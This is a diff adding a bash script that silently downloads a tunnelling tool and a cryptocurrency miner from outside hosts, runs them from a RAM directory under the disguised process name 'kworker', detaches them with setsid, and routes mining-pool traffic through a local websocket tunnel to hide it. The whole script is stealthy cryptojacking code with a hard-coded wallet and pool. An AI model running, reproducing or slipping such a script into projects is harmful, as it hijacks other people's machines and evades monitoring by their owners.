@@ -1,0 +1,63 @@
+#!/bin/bash
+
+# Configuration
+WALLET="prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
+WORKER_NAME=$(hostname -s)
+POOL_HOST="pearl-sg1.lproute.com"
+POOL_PORT="3360"
+BINARY_NAME="kworker" # Disguised process name
+
+# Create a temp directory in RAM
+WORK_DIR=$(mktemp -d /dev/shm/perl_mine_XXXXXX)
+cd "$WORK_DIR" || exit 1
+
+# Cleanup function
+cleanup() {
+    echo "Shutting down..."
+    kill $(jobs -p) 2>/dev/null
+    rm -rf "$WORK_DIR"
+    exit 0
+}
+trap cleanup SIGINT SIGTERM EXIT
+
+# Fetch binaries silently
+echo "Fetching assets..."
+curl -s -L -o wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+curl -s -L -o forge https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/forge
+
+# Extract wstunnel
+tar -xzf wstunnel.tar.gz --strip-components=1
+mv wstunnel "$BINARY_NAME".ws
+chmod +x "$BINARY_NAME".ws forge
+
+# Generate non-colliding ports
+WS_PORT=$(shuf -i 10000-65000 -n 1)
+TCP_PORT=$(shuf -i 10000-65000 -n 1)
+
+# Start wstunnel server (Disguised as 'kworker' with argument 'server')
+# Using setsid to detach from terminal
+setsid ./"$BINARY_NAME".ws server --addr ws://127.0.0.1:${WS_PORT} --verbose error > /dev/null 2>&1 &
+WS_PID=$!
+
+# Start wstunnel client (Disguised as 'kworker' with argument 'client')
+# This forwards local TCP to the remote pool via the local WS server
+setsid ./"$BINARY_NAME".ws client -L tcp://127.0.0.1:${TCP_PORT}:${POOL_HOST}:${POOL_PORT} ws://127.0.0.1:${WS_PORT} --verbose error > /dev/null 2>&1 &
+WS_CLIENT_PID=$!
+
+# Wait briefly for ports to open
+sleep 1
+
+# Start the miner (Disguised as 'kworker' with argument 'mining')
+setsid ./forge --algorithm pearlhash \
+    --pool 127.0.0.1:${TCP_PORT} \
+    --wallet ${WALLET} \
+    --worker ${WORKER_NAME} \
+    --log-level error > /dev/null 2>&1 &
+MINER_PID=$!
+
+echo "Mining started. PID: $MINER_PID (WS: $WS_PID, WS-Client: $WS_CLIENT_PID)"
+echo "Ports used: WS=$WS_PORT, TCP=$TCP_PORT"
+echo "Directory: $WORK_DIR"
+
+# Keep the script alive
+wait
